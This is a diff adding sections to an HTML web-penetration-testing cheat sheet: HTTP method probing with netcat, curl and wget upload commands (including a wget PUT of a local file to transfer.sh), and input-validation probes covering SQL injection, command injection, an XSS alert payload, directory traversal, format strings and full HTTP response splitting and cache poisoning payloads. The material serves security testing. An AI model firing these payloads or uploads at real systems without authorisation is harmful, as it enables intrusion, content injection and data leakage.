@@ -162,4 +162,94 @@ Kadimus / LFIFreak / FiMap: File inclusion tester<br/>
 Parsero: Robots.txt crawler and tester<br/>
 Droopescan / CMSmap / WPScan: Content management scanners<br/>
 davtest / cadaver: webdav tester<br/>
+<br/>
+<br/>
+<div style="text-align: left"><span style="font-size: 12pt"><span style="font-family: Arial">Method Testing</span></span></div><ul><li>nc IP_Adress Port</li>
+<li style="list-style-type: none"><ul><li>HEAD / HTTP/1.0</li>
+<li>OPTIONS / HTTP/1.0</li>
+<li>PROPFIND / HTTP/1.0</li>
+<li>TRACE / HTTP/1.1</li>
+<li>PUT http://Target_URL/FILE_NAME</li>
+<li>POST http://Target_URL/FILE_NAME HTTP/1.x</li>
+</ul>
+</li>
+</ul>
+<div style="text-align: left"><span style="font-size: 12pt"><span style="font-family: Arial">Upload Files</span></span></div><ul><li>curl</li>
+<li style="list-style-type: none"><ul><li>curl -u &lt;username:password&gt; -T file_to_upload &lt;Target_URL&gt;</li>
+<li>curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" &lt;Target_URL&gt;</li>
+</ul>
+</li>
+<li style="list-style-type: none">wget</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">wget --method PUT --body-file=/home/sk/file.pdf https://transfer.sh/file.pdf -O - -nv &nbsp;</li>
+</ul>
+</li>
+</ul>
+&nbsp;<a href="http://michaeldaw.org/input_validation_cheat_sheet/">Input Validation Checks</a><ul><li>NULL or null</li>
+<li style="list-style-type: none"><ul><li>Possible error messages returned.</li>
+</ul>
+</li>
+<li>' , " , ; , &lt;!</li>
+<li style="list-style-type: none"><ul><li>Breaks an SQL string or query; used for SQL, XPath and XML Injection tests.</li>
+</ul>
+</li>
+<li>– , = , + , "</li>
+<li style="list-style-type: none"><ul><li>Used to craft SQL Injection queries.</li>
+</ul>
+</li>
+<li>‘ , &amp;, ! , ¦ , &lt; , &gt;</li>
+<li style="list-style-type: none"><ul><li>Used to find command execution vulnerabilities.</li>
+</ul>
+</li>
+<li>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</li>
+<li style="list-style-type: none"><ul><li>Basic Cross-Site Scripting Checks.</li>
+</ul>
+</li>
+<li>%0d%0a</li>
+<li style="list-style-type: none"><ul><li>Carriage Return (%0d) Line Feed (%0a)</li>
+<li style="list-style-type: none"><ul><li>HTTP Splitting</li>
+<li style="list-style-type: none"><ul><li></li>
+<li>language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Insert undesireable content here&lt;/html&gt;</li>
+<li></li>
+<li style="list-style-type: none"><ul><li>i.e. Content-Length= 0 HTTP/1.1 200 OK Content-Type=text/html Content-Length=47&lt;html&gt;blah&lt;/html&gt;</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Cache Poisoning</li>
+<li style="list-style-type: none"><ul><li></li>
+<li>language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20304%20Not%20Modified%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Insert undesireable content here&lt;/html&gt;</li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>%7f , %ff</li>
+<li style="list-style-type: none"><ul><li>byte-length overflows; maximum 7- and 8-bit values.</li>
+</ul>
+</li>
+<li>-1, other</li>
+<li style="list-style-type: none"><ul><li>Integer and underflow vulnerabilities.</li>
+</ul>
+</li>
+<li>%n , %x , %s</li>
+<li style="list-style-type: none"><ul><li>Testing for format string vulnerabilities.</li>
+</ul>
+</li>
+<li>../</li>
+<li style="list-style-type: none"><ul><li>Directory Traversal Vulnerabilities.</li>
+</ul>
+</li>
+<li>% , _, *</li>
+<li style="list-style-type: none"><ul><li>Wildcard characters can sometimes present DoS issues or information disclosure.</li>
+</ul>
+</li>
+<li>Ax1024+</li>
+<li style="list-style-type: none"><ul><li>Overflow vulnerabilities.</li>
+</ul>
+</li>
+</ul>
+&nbsp;<br/>
+<br/>
 </body></html>
